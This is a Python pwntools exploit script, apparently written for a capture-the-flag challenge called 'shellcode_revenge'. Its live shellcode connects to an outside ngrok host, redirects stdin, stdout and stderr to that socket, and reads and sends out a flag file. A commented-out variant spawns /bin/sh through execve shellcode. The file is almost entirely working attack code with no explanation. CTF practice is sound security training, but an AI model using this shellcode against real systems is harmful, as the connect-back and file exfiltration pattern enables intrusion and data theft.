#!/usr/bin/env python3
from pwn import *

def s(p, data): p.send(data)
def sl(p, data): p.sendline(data)
def sla(p, msg, data): p.sendlineafter(msg, data)
def sa(p, msg, data): p.sendafter(msg, data)
def rl(p): return p.recvline()
def ru(p, msg): return p.recvuntil(msg)
def r(p, size): return p.recv(size)

def intFromByte(p, size):
    o = p.recv(size)[::-1].hex()
    output = '0x' + o
    leak = int(output, 16)
    return leak

def get_exe_base(pid):
    maps_file = f"/proc/{pid}/maps"
    exe_base = None

    with open(maps_file, 'r') as f:
        exe_base = int(f.readline().split('-')[0], 16)

    if exe_base is None:
        raise Exception("Executable base address not found.")

    return exe_base

def GDB(p):
    base = get_exe_base(p.pid)
    gdb.attach(p, gdbscript=f'''
        b*{base}+0x000000000000134E
        c
    ''')
    input()

def main():
    context.binary = exe = ELF("./shellcode_revenge", checksec=False)
    p = process(exe.path)
    # p = remote("157.15.86.73", 8007)
    # GDB(p)
    host = '0.tcp.ap.ngrok.io'
    port = 10951
    shellcode = "push 0x0"
    shellcode += shellcraft.amd64.linux.socket(network='ipv4', proto='tcp')
    shellcode += 'mov r12 ,rax'
    shellcode += shellcraft.amd64.linux.connect(host, port, network='ipv4')
    shellcode += shellcraft.amd64.linux.dup2('r12', 0)
    shellcode += shellcraft.amd64.linux.dup2('r12', 1)
    shellcode += shellcraft.amd64.linux.dup2('r12', 2)
    shellcode += shellcraft.open('/home/ctf/flag.txt')
    shellcode += shellcraft.amd64.linux.read('rax','r10',0x20)
    shellcode += shellcraft.amd64.linux.write(1, 'r10', 32)

    shellcode = asm(shellcode)
    sl(p, shellcode)
    p.interactive()

if __name__ == "__main__":
    main()
# from pwn import *

# exe = ELF("./shellcode_revenge")

# def conn():
#     if args.LOCAL:
#         r = process([exe.path])
#         if args.DEBUG:
#             gdb.attach(r)
#     else:
#         r = remote("addr", 13775)

#     return r


# context.binary = exe
# def main():
#     r = conn()
#     shellcode = asm(
#         '''
#         mov rax, 2                  # syscall: open
#         lea rdi, [rip+dev_null]     # path to "/dev/null"
#         xor rsi, rsi                # flags: O_RDONLY
#         syscall                     # open("/dev/null")
        
#         mov rdi, rax                # fd returned by open
#         mov rsi, 0                  # redirect to stdin
#         mov rax, 33                 # syscall: dup2
#         syscall                     # dup2(fd, 0)

#         mov rsi, 1                  # redirect to stdout
#         syscall                     # dup2(fd, 1)

#         mov rsi, 2                  # redirect to stderr
#         syscall                     # dup2(fd, 2)

#         mov rax, 0x3b               # syscall: execve
#         mov rdi, 29400045130965551  # push '/bin/sh'
#         push rdi
#         mov rdi, rsp                # set rdi to pointer to '/bin/sh'
#         xor rsi, rsi                # rsi = NULL (argv)
#         xor rdx, rdx                # rdx = NULL (envp)
#         syscall

#         dev_null: .ascii "/dev/null\\0"

#         ''', arch='amd64'
#         )
#     r.sendline(shellcode)
#     pause()
#     r.interactive()

# if __name__ == "__main__":
#     main()

